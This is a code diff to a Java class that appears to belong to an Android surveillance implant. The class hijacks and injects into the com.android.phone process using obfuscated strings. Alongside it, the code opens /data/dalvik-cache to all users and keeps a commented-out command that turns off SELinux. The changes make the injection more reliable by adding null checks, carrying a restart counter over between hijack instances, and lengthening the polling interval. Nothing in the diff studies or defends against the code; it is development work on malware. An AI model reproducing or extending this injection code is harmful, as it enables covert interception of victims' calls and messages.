@@ -26,6 +26,12 @@ public class OOBManager implements Runnable{
 	private boolean runOOB = false;
 	private boolean threadRunning = false;
 	private Thread thread = null;
+	private static int instrumentationTargetInterruptions = 0;
+
+	/**
+	 * Indicates if the main thread is running
+	 * @return threadRunning
+	 */
 
 	public synchronized boolean isThreadRunning() {
 		return threadRunning ;
@@ -54,15 +60,17 @@ public class OOBManager implements Runnable{
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
 						}
-						setThreadRunning(false);
 						this.thread = null;
-						if(this.hijack.isStarted()){
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+						if(this.hijack != null) {
+							if (this.hijack.isStarted()) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+								}
+								this.hijack.stopInstrumentation();
 							}
-							this.hijack.stopInstrumentation();
+							instrumentationTargetInterruptions = this.hijack.getRestartCounter();
+							this.hijack = null;
 						}
-						this.hijack = null;
 						break;
 					}
 				} catch (Exception e) {
@@ -115,7 +123,7 @@ public class OOBManager implements Runnable{
 					hijack.checkProcessMonitor(false);
 				}
 			}
-			Utils.sleep(1000);
+			Utils.sleep(5000);
 		}
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(run): asked to stop");
@@ -129,7 +137,7 @@ public class OOBManager implements Runnable{
 				Check.log(TAG + "(run): failed to stopInstrumentation");
 			}
 		}
-
+		setThreadRunning(false);
 	}
 
 
@@ -166,6 +174,10 @@ public class OOBManager implements Runnable{
 	}
 
 	public static boolean startInjection() {
+		/*
+		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
+		 * in case the process is killed while used?
+		 */
 		createMsgStorage();
 		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
 		//Execute.executeRoot(M.e("setenforce 0") );
@@ -173,6 +185,7 @@ public class OOBManager implements Runnable{
 		if(hijack==null) {
 			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"),M.e("radio"));
 			hijack.setInstrumentationSuccessDir(messageStorage);
+			hijack.setRestartCounter(instrumentationTargetInterruptions);
 			/* todo: instead of kill the process as precaution, try to understand if is already injected
 			 * for example check for the needle inside the memory of the target process.
 			*/
